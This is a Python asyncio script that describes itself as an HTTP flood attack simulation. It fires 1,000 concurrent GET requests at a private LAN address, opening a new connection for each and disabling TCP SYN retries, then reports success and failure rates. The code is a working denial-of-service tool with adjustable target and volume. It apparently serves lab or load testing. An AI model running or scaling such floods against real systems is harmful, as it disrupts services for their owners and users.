import asyncio
import aiohttp
import time
import socket
import platform

# --- Configuration ---
TARGET_URL = 'http://192.168.100.1/'
REQUEST_COUNT = 1000
CONCURRENT_REQUESTS = 100 # How many requests to run in parallel at a time

# --- Counters for statistics ---
success_count = 0
failure_count = 0

# --- Custom TCPConnector for older aiohttp versions ---
class CustomConnector(aiohttp.TCPConnector):
    """
    A custom TCPConnector that allows setting socket options like TCP_SYNCNT.
    This is required for versions of aiohttp older than 3.0.
    """
    def __init__(self, *args, **kwargs):
        # Pop the custom argument before passing to the parent
        self._sock_opts = kwargs.pop('socket_options', [])
        super().__init__(*args, **kwargs)

    async def _create_connection(self, req, traces, timeout):
        # Create the connection using the parent's method
        transport, protocol = await super()._create_connection(req, traces, timeout)
        
        # After connection, get the underlying socket and set options
        sock = transport.get_extra_info('socket')
        if sock is not None:
            for level, optname, value in self._sock_opts:
                try:
                    sock.setsockopt(level, optname, value)
                except (OSError, NameError) as e:
                    # This might fail if the option is not supported (e.g., on non-Linux)
                    print(f"Warning: Could not set socket option {optname}: {e}")
        
        return transport, protocol

async def send_request(session, url):
    """Sends a single HTTP GET request and handles the outcome."""
    global success_count, failure_count
    try:
        # Set a client-side timeout. If the kernel fails to connect 
        # (because SYN is dropped and not retried), this will eventually trigger.
        async with session.get(url, timeout=2) as response:
            if response.status == 200:
                success_count += 1
            else:
                failure_count += 1
            await response.release()

    except asyncio.TimeoutError:
        # This triggers if the entire request process takes longer than the timeout.
        failure_count += 1
    except aiohttp.ClientConnectorError:
        # This is the most likely error when a SYN packet is dropped and not retried.
        # The OS fails to establish a connection and reports an error.
        failure_count += 1
    except aiohttp.ClientError:
        # Catches other potential client-side errors.
        failure_count += 1

async def main():
    """Main function to coordinate the flood attack simulation."""
    print(f"Starting HTTP flood: {REQUEST_COUNT} requests to {TARGET_URL}")
    print(f"Mode: 1 Request = 1 New TCP Connection, No SYN Retries.")
    start_time = time.time()

    # --- Core Configuration ---
    
    # 1. Define socket options to disable SYN retries
    sock_opts = []
    if platform.system() == "Linux":
        # (level, optname, value)
        # TCP_SYNCNT=1 means 1 initial SYN and 0 retries.
        sock_opts.append((socket.IPPROTO_TCP, socket.TCP_SYNCNT, 1))
    else:
        print("Warning: TCP_SYNCNT option is only effective on Linux. The OS may retry SYNs on other platforms.")

    # 2. Use the CustomConnector
    #    - force_close=True: Prevents connection pooling.
    #    - socket_options: Our custom argument to pass the options.
    conn = CustomConnector(
        force_close=True, 
        socket_options=sock_opts
    )

    async with aiohttp.ClientSession(connector=conn) as session:
        sem = asyncio.Semaphore(CONCURRENT_REQUESTS)
        tasks = []

        async def limited_request(url):
            async with sem:
                await send_request(session, url)

        for _ in range(REQUEST_COUNT):
            task = asyncio.create_task(limited_request(TARGET_URL))
            tasks.append(task)
        
        await asyncio.gather(*tasks)

    end_time = time.time()
    duration = end_time - start_time

    print("\n--- Simulation Finished ---")
    print(f"Total requests attempted: {REQUEST_COUNT}")
    print(f"Successful responses (200 OK): {success_count}")
    print(f"Failed/Dropped requests: {failure_count}")
    print(f"Total duration: {duration:.2f} seconds")
    if duration > 0:
        print(f"Requests per second (RPS): {REQUEST_COUNT / duration:.2f}")

if __name__ == '__main__':
    asyncio.run(main())